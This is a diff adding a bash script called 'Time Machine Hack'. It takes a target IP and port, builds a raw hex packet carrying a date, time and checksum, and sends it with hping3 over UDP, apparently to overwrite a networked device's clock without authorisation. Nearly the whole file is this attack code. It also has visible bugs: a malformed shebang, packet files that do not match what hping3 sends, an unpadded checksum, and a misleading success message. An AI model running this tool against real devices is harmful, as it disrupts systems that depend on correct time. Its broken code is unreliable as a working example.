@@ -1,0 +1,186 @@
+#/bin/bash
+echo " Welcome to Time Machine Hack :)"
+
+echo "Enter IP Address of Machine"
+read ip
+
+echo "Enter Port Number"
+read port
+
+echo 'Choice Please'
+echo "1. Default Time"
+echo "2. Reverse It"
+read choice
+
+
+############################fix time######################################33
+
+if [ $choice -eq 1 ]
+then 
+
+date=$(date "+%d") 
+date=${date#0}
+month=$(date "+%m") 
+month=${month#0}
+hour=$(date "+%H")
+hour=${hour#0}
+min=$(date "+%M")  
+sec=$(date "+%S") 
+
+d=$(echo "obase=16; $date" | bc)
+ 
+dat=$(echo -n $d | wc -c)
+
+if [ $dat -eq 1 ]
+then
+d=$(echo "0$d")
+fi
+ 
+#converting  month into hexadecimal
+ 
+mon=$(echo "obase=16; $month" | bc)
+
+mont=$(echo -n $mon | wc -c)
+
+if [ $mont -eq 1 ]
+then
+mon=$(echo "0$mon")
+fi
+
+#converting  hour into hexadecimal
+
+h=$(echo "obase=16; $hour" | bc)
+hou=$(echo -n $h | wc -c)
+ if [ $hou -eq 1 ]
+then
+h=$(echo "0$h")
+fi
+
+ #converting  minute  into hexadecimal
+
+m=$(echo "obase=16; $min" | bc)
+mint=$(echo -n $m | wc -c)
+if [ $mint -eq 1 ]
+then
+m=$(echo "0$m")
+fi
+
+###seconds
+
+s=$(echo "obase=16; $sec" | bc)
+secn=$(echo -n $s | wc -c)
+if [ $secn -eq 1 ]
+then
+s=$(echo "0$s")
+fi
+
+###checksum
+
+checksum=$(( $date + $month + $hour + $min + $sec + 101 ))
+c=$(printf '%x\n' $checksum)
+
+# create packet time packet 
+
+echo "55 aa 01 00 4a 02 06 00 13 $mon $d $h $m $s 00 00 00 00 00 00 00 00 00 00 00 00 $c 01" | xxd -ps -r  > 4
+
+ 
+#send packets
+
+hping3 -2 $ip -p $port -d 28 -E 1 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 2 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 3 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 4 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 5 -c 1 &> /dev/null
+
+echo "Current Date $date $month and Time $hour:$min:$sec" 
+echo "Done !! Time is Reversed"
+
+
+
+
+
+########################################change time#############################
+elif [ $choice -eq 2 ]
+
+then
+
+echo " //Welcome to Time Hack//"
+echo " Enter Date"
+read date
+
+
+echo "Enter Month in Numbers"
+read month
+
+echo "Enter Time in Hours (24 hrs)"
+read hour
+
+echo "Enter Time in Minutes"
+read min
+
+#converting  date into hexadecimal
+
+d=$(printf '%x\n' $date)
+ 
+dat=$(echo -n $d | wc -c)
+
+if [ $dat -eq 1 ]
+then
+d=$(echo "0$d")
+fi
+ 
+#converting  month into hexadecimal
+ 
+mon=$(printf '%x\n' $month)
+
+mont=$(echo -n $mon | wc -c)
+
+if [ $mont -eq 1 ]
+then
+mon=$(echo "0$mon")
+fi
+
+#converting  hour into hexadecimal
+
+h=$(printf '%x\n' $hour)
+hou=$(echo -n $h | wc -c)
+ if [ $hou -eq 1 ]
+then
+h=$(echo "0$h")
+fi
+
+ #converting  minute  into hexadecimal
+
+m=$(printf '%x\n' $min)
+mint=$(echo -n $m | wc -c)
+if [ $mint -eq 1 ]
+then
+m=$(echo "0$m")
+fi
+
+
+checksum=$(( $date + $month + $hour + $min + 101 ))
+c=$(printf '%x\n' $checksum)
+
+# create packet time packet 
+
+echo "55 aa 01 00 4a 02 06 00 13 $mon $d $h $m 00 00 00 00 00 00 00 00 00 00 00 00 00 $c 01" | xxd -ps -r  > 4
+
+ 
+#send packets
+
+hping3 -2 $ip -p $port -d 28 -E 1 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 2 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 3 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 4 -c 1 &> /dev/null
+hping3 -2 $ip -p $port -d 28 -E 5 -c 1 &> /dev/null
+
+echo " Done !! Time is Reversed"
+
+
+else
+
+echo "Wrong Choice !!! Exiting !!!"
+
+fi
+
